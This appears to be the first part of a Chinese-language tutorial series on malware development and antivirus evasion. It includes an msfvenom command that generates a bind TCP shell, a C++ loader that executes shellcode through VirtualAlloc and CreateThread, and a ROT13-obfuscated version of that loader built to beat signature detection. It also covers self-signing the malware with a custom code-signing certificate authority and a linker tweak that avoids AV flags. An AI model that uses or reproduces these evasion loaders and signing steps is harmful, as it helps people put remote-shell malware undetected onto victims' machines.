**介绍**

  

  

本系列讲的是恶意软件的开发与检测，这是第一篇。本系列会试着用恶意应用程序来执行代码，躲避防护，持续攻击。

  

首先，需要创建一个C++应用程序来运行恶意shellcode，同时尝试不被AV软件捕获。

  

为什么用的是C++，而不是C#或Powershell的脚本？因为与托管代码和脚本相比，分析已编译的二进制文件要困难得多。

  

本系列会在Win 10 1901版本上用MS Visual Studio 2017。

  

  

  

**检测**

  

  

反恶意软件解决方案可以用三种类型的检测机制：

  

*   基于签名的检测-静态检查文件校验和（MD5，SHA1等）以及二进制文件中是否存在已知字符串或字节序列。
    
*   启发式检测-（通常）对应用程序行为进行静态分析并识别潜在的恶意特征（例如，使用通常与恶意软件相关联的特定功能）。
    
*   沙盒-对程序进行动态分析，该程序在受控环境（沙盒）中执行，其行为受监视。
    

  

存在逃避不同检测机制的多种技术。例如：

  

*   多态（或至少经常重新编译）的恶意软件可以逃过基于签名的检测。
    
*   对代码流的混淆可以逃避基于启发式的检测。
    
*   基于环境检查的条件语句可以检测并绕过沙盒。
    
*   敏感信息的编码或加密有助于绕过基于签名的检测和启发式检测。

**生成shellcode**

  

  

使用Metasploit生成一些恶意的shellcode——让它绑定TCP shell。

  

msfvenom -p windows/shell\_bind\_tcp LPORT=4444 -f c

  

Shellcode是旨在运行本地或远程系统Shell的一部分机器代码。它们主要用在利用软件漏洞的过程中——当攻击者能够控制程序的执行流程时，他需要一些通用有效载荷来执行所需的操作（通常是shell访问）。这适用于本地利用（例如，特权升级）和远程利用（例如，在服务器上获得RCE）。

  

Shellcode是一个引导程序代码，它利用已知的平台特定机制来执行特定操作（创建进程，启动TCP连接等）。Windows shellcodes通常使用TEB（线程环境块）和PEB（进程环境块）来寻找加载系统库的地址（kernel32.dll，kernelbase.dll或ntdll.dll），然后通过“浏览”，找到地址以及可以用于定位其他函数的函数。kernel32.dllkernelbase.dllntdll.dllLoadLibraryGetProcAddress

  

生成的shellcode可以作为字符串包含在二进制文件中。char数组的执行通常涉及将该数组转换为指针，在转换成如下函数：

**执行shellcode**

  

  

执行shellcode的方式如下：

  

*   用Windows API的功能VirtualAlloc（或VirtualAllocEx用于远程进程）分配新的内存区域。
    
*   用shellcode字节填充它（例如，RtlCopyMemory是memcpy包装器的函数）。
    
*   分别用CreateThread或CreateRemoteThread函数创建一个新线程。
    

  

只要将Shellcode所在的内存区域标记为可执行文件，也可以使用char数组执行指针转换来执行Shellcode。

  

以下是源代码：

  

*   
*   
*   
*   
*   
*   
*   
*   
*   

```
void main(){  const char shellcode[] = "\xfc\xe8\x82 (...) ";  PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);  RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);  DWORD threadID;  HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);  WaitForSingleObject(hThread, INFINITE);}
```

**shellcode混淆**

  

  

首先根据其内容修改shellcode，逃避静态识别特征。

  

我们可以尝试最简单的“加密”-将ROT13密码用于嵌入式shellcode的所有字节——0x41变为0x54，0xFF变为0x0C等等。在执行期间，从每个字节中减去0x0D (13)值，shellcode就被“解密” 。

  

该代码如下所示：

  

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
#include <Windows.h>
void main(){  const char shellcode[] = "\x09\xf5\x8f (...) ";  PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);  RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);  DWORD threadID;  for (int i = 0; i < sizeof shellcode; i++)  {    ((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) - 13;  }  HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);  WaitForSingleObject(hThread, INFINITE);}
```

**2\. 签署二进制文件**

  

一些恶意软件检测引擎可能会将未签名的二进制文件标记为可疑。生成代码签名基础结构-我们将需要证书授权和代码签名证书：

  

*   
*   
*   
*   
*   

```
makecert -r -pe -n "CN=Malwr CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MalwrCA.pvk MalwrCA.cercertutil -user -addstore Root MalwrCA.cermakecert -pe -n "CN=Malwr Cert" -a sha256 -cy end -sky signature -ic MalwrCA.cer -iv MalwrCA.pvk -sv MalwrCert.pvk MalwrCert.cerpvk2pfx -pvk MalwrCert.pvk -spc MalwrCert.cer -pfx MalwrCert.pfxsigntool sign /v /f MalwrCert.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll Malware.exe
```

  

执行完上述命令后，我们生成了“Malwr”证书颁授权，将其导入到我们的证书存储中，以.pfx格式创建了代码签名证书，并用它对可执行文件进行签名。

**3\. 链接库**

  

在用Visual C ++项目编译和链接属性时，我发现，如果从Linker选项中删除其他依赖项（尤其是kernel32.lib）时，某些反恶意软件引擎会停止把已生成的可执行文件标记为恶意。有趣的是，由于kernel32.lib静态库在编译后仍会被静态链接，因为可执行文件需要知道基本API函数的位置（源自kernel32.dll）。
